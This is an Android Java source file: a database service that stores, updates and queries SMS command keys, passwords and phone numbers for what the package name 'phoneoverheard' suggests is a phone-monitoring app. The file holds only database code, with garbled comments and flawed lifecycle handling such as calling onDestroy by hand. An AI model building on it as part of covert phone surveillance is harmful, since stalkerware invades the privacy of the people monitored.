package com.phoneoverheard.database;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.IBinder;

@SuppressLint("SimpleDateFormat")
public class SmscmdService extends Service {
    @SuppressWarnings("unused")
	private static final String TAG = "smscmdService";   
    private DatabaseHelper SmscmdDatabasehelper; 
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	
	public SmscmdService(Context context){
		this.SmscmdDatabasehelper = new DatabaseHelper(context);
	}

	public  void close() {
		if (SmscmdDatabasehelper != null) {
			SmscmdDatabasehelper.close();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		if (SmscmdDatabasehelper != null) {
			SmscmdDatabasehelper.close();
		}
	}
	
	/**
     *�����ָ����в�������
     * @param smscmd 
     * @return ��
     */
    public void insert (Smscmd smscmd){ 
    	SQLiteDatabase db = SmscmdDatabasehelper.getWritableDatabase();
    	db.execSQL("insert into smscmd(smskey,password,telnumber) values(?,?,?)",
    			new Object[]{ smscmd.getSmskey(),smscmd.getPassword(),smscmd.getTelnumber()});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�Ӷ���ָ�����ɾ������
     * @param smskey 
     * @return ��
     */
    public void delete (String smskey){ 
    	SQLiteDatabase db = SmscmdDatabasehelper.getWritableDatabase();
    	db.execSQL("delete from smscmd where smskey=?", new Object[]{smskey});
    	db.close();
    	close();
    	onDestroy();
    }
    
	/**
     *�޸Ķ���ָ���������
     * @param smscmd 
     * @return ��
     */
    public void update (Smscmd smscmd){ 
    	SQLiteDatabase db = SmscmdDatabasehelper.getWritableDatabase();
    	db.execSQL("update smscmd set password=?,telnumber=? where smskey=?",
    			new Object[]{ smscmd.getPassword(),smscmd.getTelnumber(),smscmd.getSmskey()});
    	db.close();
    	close();
    	onDestroy();
    }

	/**
     *���Ҷ���ָ�����ĳ�� ����
     * @param smscmd 
     * @return ��
     */
    public Smscmd find (String smskey){ 
    	String password = "";
    	String telnumber = "";
    	SQLiteDatabase db = SmscmdDatabasehelper.getReadableDatabase();
    	Cursor smscmdCursor = db.rawQuery("select * from smscmd where smskey=?", new String[]{smskey});
    	if(smscmdCursor.moveToFirst()){
    		smskey = smscmdCursor.getString(smscmdCursor.getColumnIndex("smskey"));
    		password = smscmdCursor.getString(smscmdCursor.getColumnIndex("password"));
    		telnumber = smscmdCursor.getString(smscmdCursor.getColumnIndex("telnumber"));    		
    	}
    	if(smscmdCursor != null){
    		smscmdCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
    	return new Smscmd(smskey,password,telnumber);
    }

	/**
     *��ҳ��ѯ����ָ���������
     * @param pffset �ӵڼ������ݿ�ʼ
     * @param maxResult ��󷵻ؼ�������
     * @return List<Smscmd> �����
     */
    public List<Smscmd> getScrolldata (int pffset,int maxResult){ 
    	List<Smscmd> smscmd = new ArrayList<Smscmd>();
    	SQLiteDatabase db = SmscmdDatabasehelper.getReadableDatabase();
    	Cursor smscmdCursor = db.rawQuery("select * from smscmd order by _id asc limit ?,?", 
    				new String[]{String.valueOf(pffset),String.valueOf(maxResult)});
    	while(smscmdCursor.moveToNext()){
    		String smskey = smscmdCursor.getString(smscmdCursor.getColumnIndex("smskey"));
    		String password = smscmdCursor.getString(smscmdCursor.getColumnIndex("password"));
    		String telnumber = smscmdCursor.getString(smscmdCursor.getColumnIndex("telnumber"));
    		smscmd.add(new Smscmd(smskey,password,telnumber));
    	}
    	if(smscmdCursor != null){
    		smscmdCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return smscmd;
    }
    
	/**
     *��ѯ����ָ��������ݼ�¼����
     * @param ��
     * @return result ��¼����
     */
    public Long getCount (){ 
    	SQLiteDatabase db = SmscmdDatabasehelper.getReadableDatabase();
    	Cursor smscmdCursor = db.rawQuery("select count(*) from smscmd", null);
    	smscmdCursor.moveToFirst();
    	long result = smscmdCursor.getLong(0);
    	if(smscmdCursor != null){
    		smscmdCursor.close();
    	}
    	db.close();
    	close();
    	onDestroy();
		return result;
    }
}
